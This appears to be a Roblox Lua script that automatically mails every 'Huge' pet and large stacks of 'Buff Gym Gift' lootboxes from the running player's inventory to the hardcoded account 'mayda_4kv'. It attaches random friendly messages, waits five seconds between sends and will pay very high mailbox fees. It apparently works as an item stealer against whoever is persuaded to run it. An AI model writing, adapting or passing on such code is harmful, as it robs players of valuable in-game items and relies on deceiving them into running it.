local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Network = ReplicatedStorage:WaitForChild("Network")
local SaveProvider = require(ReplicatedStorage.Library.Client.Save)
local costGrowthRate = require(ReplicatedStorage.Library.Types.Mailbox).DiamondCostGrowthRate
local startMailCost = require(ReplicatedStorage.Library.Balancing.Constants).MailboxDiamondCost

local Mail = {}

-- Сообщения для случайного выбора
local messages = {
    "Enjoy this!", "For you", "Gift time", "Take this", "Have fun", "Surprise drop",
    "Lucky day", "Happy gift", "Treasure time", "Free stuff", "Just because", "For luck",
    "Much love", "With care", "From me", "Claim now", "Be happy", "One for you",
    "Shiny gift", "You earned it", "Random joy", "It's yours", "Catch this", "Sharing wealth",
    "Loot drop", "You deserve", "Feel rich", "More gems", "Special treat", "A small gift"
}
_G.Mail_Config = {
    ["All Huges"] = {Class = "Pet", MinAmount = 1},
    ["Buff Gym Gift"] = {Class = "Lootbox", MinAmount = 100}
}
-- Получить стоимость отправки письма
local function getMailCost()
    local data = SaveProvider.Get()
    local count = data.MailboxSendsSinceReset or 0
    local isVIP = data.Gamepasses and data.Gamepasses.VIP
    return isVIP and startMailCost or startMailCost * costGrowthRate ^ count
end

-- Основная функция отправки почты
function Mail.Send(mailConfig, recipient, maxCost)
    local save = SaveProvider.Get()
    local inventory = save.Inventory

    for configId, config in pairs(mailConfig) do
        local class = config.Class
        local inv = inventory[class]

        if not inv then continue end

        for uuid, item in pairs(inv) do
            local match = false

            if configId == "All Huges" then
                match = string.find(item.id, "Huge") ~= nil
            else
                match = item.id == configId and (item._am or 1) >= config.MinAmount
            end

            if match then
                local currentMailCost = getMailCost()
                if currentMailCost > maxCost then
                    warn("Mail cost too high:", currentMailCost)
                    return
                end

                local amountToSend = item._am or 1

                local args = {
                    recipient,
                    messages[math.random(#messages)],
                    class,
                    uuid,
                    amountToSend
                }

                local success, err = Network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))

                print(success, err)
                if success then
                    print("📬 Sent", configId, "to", recipient)
                    task.wait(5)
                else
                    warn("❌ Failed to send mail:", err)
                end
            end
        end
    end
end
Mail.Send(_G.Mail_Config, "mayda_4kv", 1000000)



